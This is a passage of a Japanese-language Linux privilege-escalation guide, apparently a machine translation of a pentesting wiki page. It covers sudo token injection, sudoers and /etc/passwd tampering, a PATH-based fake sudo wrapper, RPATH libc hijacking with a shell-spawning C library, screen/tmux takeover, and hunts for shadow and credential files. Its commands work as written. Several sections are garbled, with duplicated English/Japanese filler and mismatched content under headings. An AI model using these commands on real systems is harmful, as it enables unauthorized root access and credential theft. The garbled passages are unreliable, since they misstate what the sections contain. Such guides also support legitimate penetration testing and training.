**sudo特権を持つユーザーとしてシェルにアクセスできる** シナリオでは、ユーザーのパスワードがわからない場合でも、ユーザーが `sudo` を使用してコマンドを実行するのを待つことができます。その後、sudoが使用されたセッションのトークンにアクセスし、それを使用してsudoとして任意のコマンドを実行できます（特権昇格）。

特権昇格のための要件：

* すでにユーザー "_sampleuser_" としてシェルにアクセスできる
* "_sampleuser_" が**最後の15分間**に `sudo` を使用して何かを実行している（デフォルトでは、パスワードを入力せずに `sudo` を使用できるsudoトークンの有効期間）
* `cat /proc/sys/kernel/yama/ptrace_scope` が0である
* `gdb` にアクセスできる（アップロードできる必要があります）

（`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を使用して一時的に `ptrace_scope` を有効にするか、`/etc/sysctl.d/10-ptrace.conf` を変更して `kernel.yama.ptrace_scope = 0` と設定して永久に有効にすることができます）

これらの要件がすべて満たされている場合、次の方法で特権昇格できます：[**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **最初のエクスプロイト**（`exploit.sh`）は、_tmp_ ディレクトリに `activate_sudo_token` というバイナリを作成します。これを使用して、セッションでsudoトークンを**アクティブに**することができます（自動的にルートシェルは取得できませんので、`sudo su` を実行してください）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* **第二のエクスプロイト** (`exploit_v2.sh`) は、_root が所有し setuid が設定された_ `/tmp` に sh シェルを作成します。
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* **第三のエクスプロイト** (`exploit_v3.sh`) は、**sudo トークンを永続化し、すべてのユーザーが sudo を使用できるようにする sudoers ファイルを作成**します。
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<ユーザー名>

もし、そのフォルダまたはフォルダ内の作成されたファイルのいずれかに**書き込み権限**がある場合、バイナリ[**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools)を使用して、ユーザーとPIDのためのsudoトークンを**作成**することができます。\
例えば、ユーザー名がsampleuserで、PIDが1234のシェルを持っている場合、ファイル_/var/run/sudo/ts/sampleuser_を上書きすることができ、パスワードを知る必要なくsudo特権を**取得**することができます。以下のように実行します：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、`sudo` を使用できるユーザーとその方法を設定します。これらのファイルは**デフォルトでは root ユーザーと root グループのみが読み取り可能**です。\
このファイルを**読み取ることができる場合**、興味深い情報を**入手することができる**かもしれません。また、任意のファイルを**書き込むことができる場合**、特権を**昇格させることができます**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
もし書き込み権限があれば、それを悪用することができます。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo`バイナリの代わりに、OpenBSD用の`doas`などのいくつかの代替手段があります。`/etc/doas.conf`でその設定を確認することを忘れないでください。
```
permit nopass demo as root cmd vim
```
### Sudoハイジャック

もし、あるユーザーが通常マシンに接続して特権を昇格させるために`sudo`を使用することを知っており、そのユーザーコンテキスト内でシェルを取得した場合、ルートとしてコードを実行し、その後にユーザーのコマンドを実行する新しいsudo実行可能ファイルを作成することができます。そして、ユーザーコンテキストの$PATHを変更します（たとえば、.bash\_profileに新しいパスを追加する）。そのため、ユーザーがsudoを実行すると、あなたのsudo実行可能ファイルが実行されます。

ただし、ユーザーが別のシェル（bash以外）を使用している場合は、新しいパスを追加するために他のファイルを変更する必要があります。たとえば、[sudo-piggyback](https://github.com/APTy/sudo-piggyback)は`~/.bashrc`、`~/.zshrc`、`~/.bash_profile`を変更します。[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)にも別の例があります。

または、次のように実行することもできます：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は**読み込まれる設定ファイルの場所**を示しています。通常、このファイルには次のパスが含まれています: `include /etc/ld.so.conf.d/*.conf`

これは、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれることを意味します。この設定ファイルは、**ライブラリが検索される他のフォルダ**を指すものです。例えば、`/etc/ld.so.conf.d/libc.conf` の内容は `/usr/local/lib` です。**これはシステムが `/usr/local/lib` 内のライブラリを検索することを意味します**。

もし何らかの理由で、ユーザーが以下のいずれかのパスに書き込み権限を持っている場合、特権を昇格させることができるかもしれません: `/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内の設定ファイル内の任意のフォルダ。\
この設定ミスを悪用する方法については、以下のページを参照してください:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`RPATH`変数で指定された場所にあるプログラムが、`/var/tmp/flag15/`にあるlibをコピーすることで使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`を使用して、`/var/tmp`に悪意のあるライブラリを作成します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 機能

Linuxの機能は、プロセスに利用可能なルート権限の一部を提供します。これにより、ルート権限がより小さく独立した単位に分割されます。それぞれの単位は個別にプロセスに付与することができます。これにより、特権の完全なセットが減少し、攻撃のリスクが低下します。
詳細については、次のページを読んで機能について詳しく学びましょう。

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## ディレクトリのパーミッション

ディレクトリ内の「実行」ビットは、影響を受けるユーザーがそのフォルダに「cd」できることを意味します。
「読み取り」ビットは、ユーザーがファイルを「リスト」できることを意味し、「書き込み」ビットは、ユーザーがファイルを「削除」および「作成」できることを意味します。

## ACL（アクセス制御リスト）

ACL（アクセス制御リスト）は、標準のugo/rwxの権限を上書きする可能性のある2番目のレベルの任意の権限です。正しく使用すると、ファイルやディレクトリへのアクセスを設定する際に、より細かい粒度でアクセスを設定できます。たとえば、ファイルの所有者でもグループの所有者でもない特定のユーザーにアクセスを許可または拒否することができます（[こちら](https://linuxconfig.org/how-to-manage-acls-on-linux)から）。
ユーザー「kali」にファイルに対して読み取りと書き込みの権限を与えます。
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**システムから特定のACLを持つファイルを取得する方法:**

To get files with specific ACLs from the system, you can use the `getfacl` command. This command allows you to retrieve the ACLs (Access Control Lists) of files and directories on a Linux system.

Here's how you can use the `getfacl` command to obtain files with specific ACLs:

1. Open a terminal on your Linux system.

2. Run the following command to list the ACLs of a specific file or directory:

   ```
   getfacl <file_or_directory_path>
   ```

   Replace `<file_or_directory_path>` with the path to the file or directory you want to check.

   For example, to get the ACLs of a file named `example.txt`, you would run:

   ```
   getfacl example.txt
   ```

3. The command will display the ACLs associated with the specified file or directory. Look for the specific ACLs you are interested in.

   Note: ACLs are represented in a specific format that includes the permissions and the user or group they apply to.

By using the `getfacl` command, you can easily retrieve files with specific ACLs from your Linux system.
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## シェルセッションを開く

**古いバージョン**では、異なるユーザー（**root**）のいくつかの**シェル**セッションを**乗っ取る**ことができます。\
**最新バージョン**では、**自分のユーザー**のスクリーンセッションにのみ**接続**できます。ただし、セッション内には**興味深い情報**が含まれている可能性があります。

### スクリーンセッションの乗っ取り

**スクリーンセッションの一覧表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**セッションにアタッチする**

To attach to a session, use the following command:

セッションにアタッチするには、次のコマンドを使用します:

```bash
tmux attach-session -t <session_name>
```

Replace `<session_name>` with the name of the session you want to attach to.

`<session_name>` をアタッチしたいセッションの名前に置き換えてください。

If you are unsure about the session name, you can list all the active sessions by running the following command:

セッション名がわからない場合は、次のコマンドを実行してすべてのアクティブなセッションをリストアップすることができます:

```bash
tmux list-sessions
```

This will display a list of all the active sessions along with their names.

これにより、アクティブなセッションの一覧が表示されます。

Once you have identified the session you want to attach to, use the `attach-session` command with the appropriate session name.

アタッチしたいセッションを特定したら、適切なセッション名を使用して `attach-session` コマンドを実行します。

For example, to attach to a session named "my_session", run the following command:

例えば、"my_session" という名前のセッションにアタッチするには、次のコマンドを実行します:

```bash
tmux attach-session -t my_session
```

This will attach your terminal to the specified session, allowing you to interact with the session as if you were directly connected to it.

これにより、ターミナルが指定されたセッションにアタッチされ、まるで直接接続されているかのようにセッションとやり取りすることができます。
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmuxセッションの乗っ取り

これは**古いtmuxバージョン**の問題でした。私は特権を持たないユーザーとして作成されたrootのtmux（v2.1）セッションを乗っ取ることができませんでした。

**tmuxセッションの一覧表示**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**セッションにアタッチする**

To attach to a session, use the following command:

セッションにアタッチするには、次のコマンドを使用します。

```bash
tmux attach-session -t <session_name>
```

Replace `<session_name>` with the name of the session you want to attach to.

`<session_name>` をアタッチしたいセッションの名前に置き換えてください。

If you are unsure about the session name, you can list all the active sessions by running:

セッション名がわからない場合は、次のコマンドを実行してすべてのアクティブなセッションをリストアップすることができます。

```bash
tmux list-sessions
```

This will display a list of all the active sessions along with their names.

これにより、アクティブなセッションの一覧が表示されます。

Once you have identified the session you want to attach to, use the `attach-session` command with the appropriate session name.

アタッチしたいセッションを特定したら、適切なセッション名を使用して `attach-session` コマンドを使用します。

For example, to attach to a session named "my_session", run:

例えば、"my_session" という名前のセッションにアタッチするには、次のコマンドを実行します。

```bash
tmux attach-session -t my_session
```

This will attach your terminal to the specified session, allowing you to interact with it.

これにより、ターミナルが指定したセッションにアタッチされ、それとやり取りすることができます。
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
**HTBのValentineボックス**を参照してください。

## SSH

### Debian OpenSSL予測可能PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間にDebianベースのシステム（Ubuntu、Kubuntuなど）で生成されたすべてのSSLおよびSSHキーは、このバグの影響を受ける可能性があります。\
このバグは、これらのOSで新しいsshキーを作成する際に発生します。**32,768のバリエーションしか可能ではありません**。つまり、すべての可能性を計算することができ、**sshの公開鍵を持っていれば、対応する秘密鍵を検索することができます**。計算された可能性はこちらで見つけることができます：[https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSHの興味深い設定値

* **PasswordAuthentication:** パスワード認証が許可されているかどうかを指定します。デフォルトは `no` です。
* **PubkeyAuthentication:** 公開鍵認証が許可されているかどうかを指定します。デフォルトは `yes` です。
* **PermitEmptyPasswords**: パスワード認証が許可されている場合、サーバーが空のパスワード文字列を持つアカウントへのログインを許可するかどうかを指定します。デフォルトは `no` です。

### PermitRootLogin

rootがsshを使用してログインできるかどうかを指定します。デフォルトは `no` です。可能な値は次のとおりです：

* `yes`: rootはパスワードと秘密鍵を使用してログインできます
* `without-password`または`prohibit-password`: rootは秘密鍵のみを使用してログインできます
* `forced-commands-only`: rootは秘密鍵のみを使用してログインし、コマンドオプションが指定されている場合にのみログインできます
* `no` : いいえ

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵が含まれるファイルを指定します。`%h`のようなトークンを含めることができます。これはホームディレクトリに置き換えられます。**絶対パス**（`/`で始まる）または**ユーザーのホームからの相対パス**を指定できます。例えば：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー「testusername」の**プライベート**キーでログインしようとする場合、sshはあなたのキーの公開キーを`/home/testusername/.ssh/authorized_keys`と`/home/testusername/access`に保存されている公開キーと比較します。

### ForwardAgent/AllowAgentForwarding

SSHエージェント転送を使用すると、サーバーに鍵（パスフレーズなし！）を残さずに、ローカルのSSHキーを使用できます。したがって、sshを介して**ホスト**に**ジャンプ**し、そこから**初期ホスト**にある**キー**を使用して、別の**ホストにジャンプ**することができます。

このオプションを`$HOME/.ssh.config`に次のように設定する必要があります：
```
Host example.com
ForwardAgent yes
```
注意してください、もし`Host`が`*`の場合、ユーザーが別のマシンに移動するたびに、そのホストは鍵にアクセスできるようになります（これはセキュリティ上の問題です）。

ファイル`/etc/ssh_config`はこの設定を上書きし、この構成を許可または拒否することができます。\
ファイル`/etc/sshd_config`はキーワード`AllowAgentForwarding`（デフォルトは許可）を使用してssh-agentの転送を許可または拒否することができます。

もしForward Agentが環境に設定されていることがわかった場合、特権のエスカレーションに悪用できる可能性があるため、以下のページを読んでください：

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## 興味深いファイル

### プロファイルファイル

ファイル`/etc/profile`および`/etc/profile.d/`以下のファイルは、ユーザーが新しいシェルを実行したときに実行されるスクリプトです。したがって、これらのファイルのいずれかを書き込むか変更することで特権をエスカレーションすることができます。
```bash
ls -l /etc/profile /etc/profile.d/
```
もし奇妙なプロファイルスクリプトが見つかった場合は、それを**機密情報**のためにチェックする必要があります。

### Passwd/Shadow ファイル

OSによっては、`/etc/passwd`と`/etc/shadow`ファイルの名前が異なる場合や、バックアップが存在する場合があります。そのため、**それらをすべて見つけて**、それらを読み取ることができるかどうかを**確認して**、ファイル内に**ハッシュがあるかどうか**を確認することをお勧めします。
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
いくつかの場合には、`/etc/passwd`（または同等の）ファイル内に**パスワードハッシュ**を見つけることができます。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

最初に、次のコマンドのいずれかを使用してパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
次に、ユーザー`hacker`を追加し、生成されたパスワードを追加します。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

`su`コマンドを使用して`hacker:hacker`としてログインできます。

または、以下の行を使用してパスワードのないダミーユーザーを追加することもできます。\
警告: 現在のマシンのセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：BSDプラットフォームでは、`/etc/passwd`は`/etc/pwd.db`および`/etc/master.passwd`に配置されており、`/etc/shadow`は`/etc/spwd.db`に名前が変更されています。

あなたはいくつかの**機密ファイルに書き込むことができるか**を確認する必要があります。例えば、**サービスの設定ファイル**に書き込むことができますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
たとえば、マシンが**tomcat**サーバーを実行しており、**/etc/systemd/内のTomcatサービスの設定ファイルを変更できる**場合、次の行を変更できます：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
次に、tomcatが起動される際にバックドアが実行されます。

### フォルダの確認

次のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (おそらく最後のフォルダは読み取ることができないかもしれませんが、試してみてください)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/所有されたファイル

When performing privilege escalation on a Linux system, it is important to check for any weird locations or files that may be owned by privileged users. These locations or files could potentially be used to gain elevated privileges.

以下の手順を実行して、特権の昇格に使用される可能性のある奇妙な場所や所有されたファイルをチェックしてください。

1. **/tmp ディレクトリのチェック**: 特権の昇格に使用されることがあるため、/tmp ディレクトリ内のファイルをチェックします。特に、所有者が特権ユーザーであるファイルに注意してください。

2. **/var/tmp ディレクトリのチェック**: 同様に、/var/tmp ディレクトリ内のファイルもチェックします。特権ユーザーが所有しているファイルに注意してください。

3. **/dev/shm ディレクトリのチェック**: 特権の昇格に使用されることがあるため、/dev/shm ディレクトリ内のファイルをチェックします。特に、特権ユーザーが所有しているファイルに注意してください。

4. **/etc/cron.d ディレクトリのチェック**: 特権の昇格に使用されることがあるため、/etc/cron.d ディレクトリ内のファイルをチェックします。特に、特権ユーザーが所有しているファイルに注意してください。

5. **/etc/cron.daily ディレクトリのチェック**: 同様に、/etc/cron.daily ディレクトリ内のファイルもチェックします。特権ユーザーが所有しているファイルに注意してください。

6. **/etc/cron.hourly ディレクトリのチェック**: 同様に、/etc/cron.hourly ディレクトリ内のファイルもチェックします。特権ユーザーが所有しているファイルに注意してください。

7. **/etc/cron.monthly ディレクトリのチェック**: 同様に、/etc/cron.monthly ディレクトリ内のファイルもチェックします。特権ユーザーが所有しているファイルに注意してください。

8. **/etc/cron.weekly ディレクトリのチェック**: 同様に、/etc/cron.weekly ディレクトリ内のファイルもチェックします。特権ユーザーが所有しているファイルに注意してください。

これらの場所やファイルが特権ユーザーによって所有されている場合、悪意のあるユーザーはこれらを悪用して特権の昇格を試みることができます。したがって、これらの場所やファイルを定期的にチェックし、不審な活動がないか確認することが重要です。
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最後の数分間に変更されたファイル

To identify the files that have been modified in the last few minutes, you can use the following command:

最後の数分間に変更されたファイルを特定するために、次のコマンドを使用できます。

```bash
find / -type f -mmin -5
```

This command uses the `find` utility to search for files (`-type f`) that have been modified within the last 5 minutes (`-mmin -5`). The `/` specifies the starting directory for the search, which in this case is the root directory.

このコマンドは、`find` ユーティリティを使用して、最後の5分間に変更されたファイル (`-type f`) を検索します (`-mmin -5`)。`/` は、検索の開始ディレクトリを指定します。この場合、ルートディレクトリです。

You can adjust the time interval by changing the value after `-mmin`. For example, `-mmin -10` will find files modified within the last 10 minutes.

`-mmin` の後の値を変更することで、時間間隔を調整できます。例えば、`-mmin -10` は、最後の10分間に変更されたファイルを見つけます。

Keep in mind that this command may take some time to execute, especially if you are searching through a large number of files or directories.

このコマンドは、特に大量のファイルやディレクトリを検索する場合、実行に時間がかかることがあります。
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル

Sqliteは軽量なデータベースエンジンであり、多くのアプリケーションで使用されています。Sqliteデータベースは単一のファイルに格納され、拡張子が`.db`または`.sqlite`です。

Sqliteデータベースファイルは、特権昇格攻撃の潜在的なターゲットとなることがあります。攻撃者は、アプリケーションが使用するSqliteデータベースファイルにアクセスすることで、特権を昇格させる可能性があります。

特権昇格攻撃を防ぐためには、以下の対策を実施することが重要です。

1. アプリケーションが使用するSqliteデータベースファイルのアクセス権を適切に設定する。
2. Sqliteデータベースファイルを暗号化する。
3. アプリケーションのセキュリティを強化し、不正なアクセスを防止する。

これらの対策を実施することで、Sqliteデータベースファイルを攻撃者から保護することができます。
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル

Hidden files（隠しファイル）は、Linuxシステムで一般的に使用されるセキュリティ機能です。これらのファイルは、通常のファイルと同じようにディレクトリ内に存在しますが、名前の先頭にドット（.）が付いているため、一般的には表示されません。

隠しファイルは、システムの設定や機密情報を保護するために使用されます。これには、ユーザーの設定ファイル、SSHキー、パスワードファイルなどが含まれます。攻撃者がこれらのファイルにアクセスできると、システムへの特権エスカレーションや機密情報の漏洩のリスクが高まります。

隠しファイルを表示するには、`ls -a`コマンドを使用します。これにより、通常のファイルと隠しファイルがすべて表示されます。また、隠しファイルを作成するには、ファイルまたはディレクトリの名前の先頭にドット（.）を付けます。

攻撃者は、システム上の隠しファイルを検索して、機密情報を入手するために使用することがあります。したがって、システムのセキュリティを向上させるためには、隠しファイルへのアクセスを制限する必要があります。これには、適切なファイルパーミッションとアクセス制御の設定が含まれます。
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATHにあるスクリプト/バイナリ**

It is common for Linux systems to have multiple directories in the `PATH` environment variable, which allows users to execute commands without specifying the full path to the executable. This convenience, however, can be exploited by attackers to escalate their privileges.

Linux systems typically have directories such as `/usr/local/bin`, `/usr/bin`, and `/bin` in the `PATH`. These directories contain various scripts and binaries that are accessible to all users. If an attacker can place a malicious script or binary with the same name as a commonly used command in one of these directories, they can trick users into executing their malicious code instead.

To identify potential privilege escalation opportunities through this method, you can perform the following steps:

1. List the directories in the `PATH` variable by running the command:

   ```bash
   echo $PATH
   ```

2. For each directory listed, check the permissions and ownership of the files within them. Look for files that are writable by non-privileged users or files owned by privileged users.

3. Examine the contents of the writable directories and look for any suspicious scripts or binaries that have the same name as commonly used commands.

If you find any suspicious files, investigate their contents and determine if they can be leveraged for privilege escalation.
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **ウェブファイル**

Web files are files that are accessible through a web server. These files can include HTML, CSS, JavaScript, image files, and other types of files that are used to build and display websites.

ウェブファイルは、ウェブサーバーを通じてアクセス可能なファイルです。これらのファイルには、ウェブサイトの構築と表示に使用されるHTML、CSS、JavaScript、画像ファイルなど、さまざまな種類のファイルが含まれます。

Web files are often stored in a directory on the web server, and the directory structure can vary depending on the web application or website. It is important to properly secure web files to prevent unauthorized access or modification.

ウェブファイルは、通常、ウェブサーバー上のディレクトリに保存されます。ディレクトリ構造は、ウェブアプリケーションやウェブサイトによって異なる場合があります。ウェブファイルを適切に保護して、不正なアクセスや変更を防止することが重要です。

Here are some best practices for securing web files:

ウェブファイルを保護するためのベストプラクティスは以下の通りです：

1. **Restrict directory access**: Ensure that only necessary directories are accessible to the public. Use appropriate file permissions and configure the web server to restrict access to sensitive directories.

   **ディレクトリアクセスの制限**: 必要なディレクトリのみが一般にアクセス可能であることを確認します。適切なファイルのパーミッションを使用し、ウェブサーバーを設定して、機密ディレクトリへのアクセスを制限します。

2. **Secure file uploads**: Implement proper validation and sanitization techniques to prevent malicious file uploads. Restrict the types of files that can be uploaded and scan uploaded files for malware.

   **ファイルの安全なアップロード**: 悪意のあるファイルのアップロードを防ぐために、適切なバリデーションとサニタイズの技術を実装します。アップロードできるファイルの種類を制限し、アップロードされたファイルをマルウェアスキャンします。

3. **Protect sensitive information**: Avoid storing sensitive information, such as database credentials or API keys, in web files. Store sensitive information securely and use secure methods to access them when needed.

   **機密情報の保護**: データベースの資格情報やAPIキーなどの機密情報をウェブファイルに保存しないようにします。機密情報を安全に保存し、必要な場合には安全な方法でアクセスします。

4. **Regularly update software**: Keep the web server software and any content management systems up to date with the latest security patches. Regularly check for updates and apply them promptly.

   **ソフトウェアの定期的な更新**: ウェブサーバーソフトウェアやコンテンツ管理システムを最新のセキュリティパッチで更新します。定期的に更新を確認し、迅速に適用します。

By following these best practices, you can help protect your web files from unauthorized access and maintain the security of your web applications or websites.

これらのベストプラクティスに従うことで、ウェブファイルへの不正アクセスを防ぎ、ウェブアプリケーションやウェブサイトのセキュリティを維持することができます。
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**

Backups are an essential part of any system's security strategy. They help protect against data loss and provide a way to recover from various incidents such as hardware failures, software bugs, or even malicious attacks. In the context of privilege escalation, backups can be particularly useful as they may contain sensitive information or configuration files that can be leveraged to gain higher privileges.

バックアップは、どんなシステムのセキュリティ戦略においても重要な要素です。データの損失から保護し、ハードウェアの故障、ソフトウェアのバグ、さらには悪意のある攻撃など、さまざまなインシデントからの回復手段を提供します。特に特権エスカレーションの文脈では、バックアップは、高い特権を獲得するために利用できる、機密情報や設定ファイルを含んでいる可能性があるため、特に有用です。

### **File Permissions**

File permissions play a crucial role in securing a Linux system. By properly setting permissions, you can control who can read, write, or execute files and directories. This can help prevent unauthorized access and limit the impact of privilege escalation attacks.

ファイルのパーミッションは、Linuxシステムのセキュリティを確保する上で重要な役割を果たします。適切にパーミッションを設定することで、誰がファイルやディレクトリを読み取る、書き込む、実行することができるかを制御することができます。これにより、不正なアクセスを防止し、特権エスカレーション攻撃の影響を制限することができます。

### **Service Hardening**

Hardening services involves securing the various services running on a Linux system. This includes disabling unnecessary services, configuring secure settings, and applying patches and updates regularly. By hardening services, you can reduce the attack surface and minimize the risk of privilege escalation through vulnerable services.

サービスの強化は、Linuxシステム上で実行されているさまざまなサービスのセキュリティを確保することを意味します。これには、不要なサービスの無効化、安全な設定の構成、定期的なパッチとアップデートの適用が含まれます。サービスの強化により、攻撃面を減らし、脆弱なサービスを介した特権エスカレーションのリスクを最小限に抑えることができます。

### **User Management**

Proper user management is essential for maintaining the security of a Linux system. This includes creating strong passwords, disabling unnecessary user accounts, and regularly reviewing and updating user privileges. By managing users effectively, you can prevent unauthorized access and limit the potential for privilege escalation.

適切なユーザー管理は、Linuxシステムのセキュリティを維持するために重要です。これには、強力なパスワードの作成、不要なユーザーアカウントの無効化、定期的なユーザー権限のレビューと更新が含まれます。ユーザーを効果的に管理することで、不正なアクセスを防止し、特権エスカレーションの可能性を制限することができます。

### **Logging and Monitoring**

Logging and monitoring are crucial for detecting and responding to security incidents. By enabling and configuring logging, you can capture important events and activities on your system. Monitoring these logs can help identify any suspicious or unauthorized activities, including potential privilege escalation attempts.

ログ記録と監視は、セキュリティインシデントの検出と対応において重要です。ログの有効化と設定により、システム上の重要なイベントやアクティビティを記録することができます。これらのログを監視することで、特権エスカレーションの試みを含む、不審な活動や不正な活動を特定するのに役立ちます。
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
